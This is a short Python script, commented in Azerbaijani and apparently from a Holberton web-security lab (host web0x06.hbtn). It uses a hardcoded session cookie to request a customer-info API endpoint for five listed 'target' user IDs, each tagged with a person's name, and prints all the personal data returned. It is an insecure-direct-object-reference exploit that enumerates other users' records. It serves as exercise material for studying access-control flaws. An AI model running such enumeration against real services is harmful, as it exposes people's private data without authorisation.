import requests
import json

# Hədəf istifadəçilərin ID-ləri
target_ids = [
    "20f79b3b956a4cdeb167470369e279e2",  # Linda Robinson
    "9e887e899e484dc685f4442b643404fe",  # Patricia Garcia
    "bb6259382d63430796196a7102556e6b",  # Elizabeth Martin
    "59b0e6f10a5b4f89aa08f7ccf975822a",  # Megan White
    "745eb4452f9a41c0a648a7d1128d156a"   # Ashley Thomas
]

url_template = "http://web0x06.hbtn/api/customer/info/{}"
cookies = {
    "session": "vw5CZ4aypAxDEmWUSq7mZ2XOYWfUaSVvcCaOQlRhrdo.5eImUtd-10eJCycNoR4zyDVtIOQ"
}

print("Məlumatlar çəkilir... Zəhmət olmasa gözləyin.\n")

for user_id in target_ids:
    url = url_template.format(user_id)
    
    try:
        response = requests.get(url, cookies=cookies)
        
        if response.status_code == 200:
            # Gələn bütün JSON datasını alırıq
            data = response.json().get("message", {})
            
            print(f"[{user_id}] ID-li istifadəçinin BÜTÜN məlumatları:")
            print("-" * 50)
            # Datanı oxunaqlı, pilləli JSON formatında ekrana çap edirik
            print(json.dumps(data, indent=4, ensure_ascii=False))
            print("=" * 50 + "\n")
            
        else:
            print(f"Xəta: {user_id} - Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"Bağlantı xətası: {e}")

print("Əməliyyat bitdi.")
